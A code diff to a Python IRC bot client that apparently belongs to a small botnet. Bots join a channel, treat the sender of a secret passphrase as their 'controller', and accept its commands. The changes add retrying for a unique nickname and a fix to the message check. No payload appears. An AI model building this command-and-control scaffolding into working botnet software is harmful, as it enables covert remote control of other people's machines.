@@ -14,8 +14,9 @@ class Bot_Client:
         self.port = port
         self.channel = "#" + channel
         self.secret_phrase = secret_phrase
+        self.bot_counter = 1
         #TODO figure out a way to assign unique usernames to bots
-        self.bot_nick = "robotnik" + str(random.randint(1, 30))
+        self.bot_nick = "robotnik" + str(self.bot_counter)
         self.irc_socket = None
         self.controller = None
         self.controller_nick = None
@@ -28,7 +29,7 @@ class Bot_Client:
             text = self.get_text()
             self.log(text)
 
-            # validate message (check if controller command)
+            # validate message (check if controller *command*)
             if not self.check_msg(text):
                 continue
             input_list = text.split(' :')
@@ -59,9 +60,22 @@ class Bot_Client:
 
         conn_socket.send(("USER "+ "test" +" "+ self.bot_nick +" "+ self.bot_nick + \
         " :\n").encode()) # user authentication
-        conn_socket.send(("NICK "+ self.bot_nick+"\n").encode()) # sets nick
+        self.__establish_nick(conn_socket)
         conn_socket.send(("JOIN "+ self.channel +"\n").encode()) # join the channel
         return True, conn_socket
+
+    # keeps sending nick messages until a valid nick is found
+    def __establish_nick(self, conn_socket):
+        valid_nick = False
+        while not valid_nick:
+            conn_socket.send(("NICK "+ self.bot_nick+"\n").encode()) # sets nick
+            response = conn_socket.recv(2040).decode()
+            if "433" in response:
+                self.bot_counter += 1
+                self.bot_nick = "robotnik" + str(self.bot_counter)
+            elif "001" in response:
+                valid_nick = True
+
 
     # Function to check for the secret passphrase
     def check_msg(self, text):
@@ -82,7 +96,7 @@ class Bot_Client:
                 self.controller = sender
                 self.controller_nick, _ = sender.split('!')
                 self.log("Controller Identified: " + self.controller)
-                return True
+                return False # return False b/c not a command
             else:
                 return False
         # if the message is from the current controller
